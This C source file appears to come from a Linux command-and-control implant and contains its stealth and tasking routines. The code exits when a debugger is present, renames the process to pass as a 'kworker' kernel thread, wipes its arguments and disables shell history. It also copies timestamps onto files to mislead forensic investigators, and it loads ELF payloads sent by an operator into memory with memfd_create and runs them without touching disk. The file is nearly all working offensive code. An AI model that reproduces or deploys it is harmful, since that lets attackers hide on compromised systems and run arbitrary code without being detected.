#include "starburst.h"

void opsec_init(void) {
    if (opsec_detect_debugger()) {
        _exit(0);
    }
    opsec_hide_proc();
}

int opsec_detect_debugger(void) {
    /* check TracerPid in /proc/self/status */
    FILE *fp = fopen("/proc/self/status", "r");
    if (!fp) return 0;

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int tracer = atoi(line + 10);
            fclose(fp);
            return tracer != 0;
        }
    }
    fclose(fp);
    return 0;
}

void opsec_scrub_argv(int argc, char **argv) {
    if (argc < 1 || !argv || !argv[0]) return;

    const char *fake_name = "[kworker/0:1-events]";
    size_t fake_len = strlen(fake_name);

    /* only overwrite argv[0] within its own bounds */
    size_t arg0_len = strlen(argv[0]);
    memset(argv[0], 0, arg0_len);
    if (fake_len <= arg0_len) {
        memcpy(argv[0], fake_name, fake_len);
    } else if (arg0_len > 0) {
        size_t copy = arg0_len < fake_len ? arg0_len : fake_len;
        memcpy(argv[0], fake_name, copy);
    }

    /* zero each subsequent arg individually */
    for (int i = 1; i < argc; i++) {
        if (argv[i]) {
            memset(argv[i], 0, strlen(argv[i]));
            argv[i] = NULL;
        }
    }
}

void opsec_scrub_environ(void) {
    /* remove suspicious env vars that could fingerprint our execution context */
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("HISTFILE");
    unsetenv("HISTSIZE");
    unsetenv("HISTFILESIZE");

    /* disable bash history for child shells */
    setenv("HISTFILE", "/dev/null", 1);
    setenv("HISTSIZE", "0", 1);
    setenv("HISTFILESIZE", "0", 1);
}

void opsec_hide_proc(void) {
    /* modify /proc/self/comm to blend in */
    int fd = open("/proc/self/comm", O_WRONLY);
    if (fd >= 0) {
        const char *fake = "kworker/0:1";
        write(fd, fake, strlen(fake));
        close(fd);
        g_state.proc_hidden = 1;
    }

    /* set prctl process name */
#ifdef PR_SET_NAME
    prctl(PR_SET_NAME, "kworker/0:1", 0, 0, 0);
#endif
}

void cmd_timestomp_handler(const char *task_uuid, parser_t *params) {
    char *target_path = pr_string(params);
    char *source_path = pr_string(params);

    struct stat st;
    if (stat(source_path, &st) != 0) {
        char err[512];
        snprintf(err, sizeof(err), "stat(%s): %s", source_path, strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(target_path); free(source_path);
        return;
    }

    struct timespec times[2];
    times[0] = st.st_atim;
    times[1] = st.st_mtim;

    if (utimensat(AT_FDCWD, target_path, times, 0) != 0) {
        char err[512];
        snprintf(err, sizeof(err), "utimensat(%s): %s", target_path, strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    } else {
        char msg[512];
        snprintf(msg, sizeof(msg), "timestamps copied from %s to %s", source_path, target_path);
        queue_response(task_uuid, RSP_SUCCESS, msg);
    }
    free(target_path); free(source_path);
}

void cmd_memfd_exec(const char *task_uuid, parser_t *params) {
    uint32_t elf_len;
    const uint8_t *elf_data = pr_bytes(params, &elf_len);
    char *args_str = pr_string(params);

    if (!elf_data || elf_len == 0) {
        queue_response(task_uuid, RSP_ERROR, "no ELF data provided");
        free(args_str);
        return;
    }

    int fd = (int)syscall(SYS_memfd_create, "", 1 /* MFD_CLOEXEC */);
    if (fd < 0) {
        queue_response(task_uuid, RSP_ERROR, "memfd_create failed");
        free(args_str);
        return;
    }

    if (write(fd, elf_data, elf_len) != (ssize_t)elf_len) {
        close(fd);
        queue_response(task_uuid, RSP_ERROR, "write to memfd failed");
        free(args_str);
        return;
    }

    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    pid_t child = fork();
    if (child < 0) {
        close(fd);
        queue_response(task_uuid, RSP_ERROR, "fork failed");
        free(args_str);
        return;
    }

    if (child == 0) {
        char *argv[64];
        argv[0] = fd_path;
        int argc = 1;

        char *args_copy = args_str ? strdup(args_str) : NULL;
        if (args_copy && args_copy[0]) {
            char *tok = strtok(args_copy, " ");
            while (tok && argc < 63) {
                argv[argc++] = tok;
                tok = strtok(NULL, " ");
            }
        }
        argv[argc] = NULL;

        execv(fd_path, argv);
        _exit(127);
    }

    close(fd);

    int status;
    waitpid(child, &status, 0);

    char msg[128];
    if (WIFEXITED(status)) {
        snprintf(msg, sizeof(msg), "exited with code %d", WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
        snprintf(msg, sizeof(msg), "killed by signal %d", WTERMSIG(status));
    } else {
        snprintf(msg, sizeof(msg), "unknown exit status %d", status);
    }
    queue_response(task_uuid, RSP_SUCCESS, msg);
    free(args_str);
}
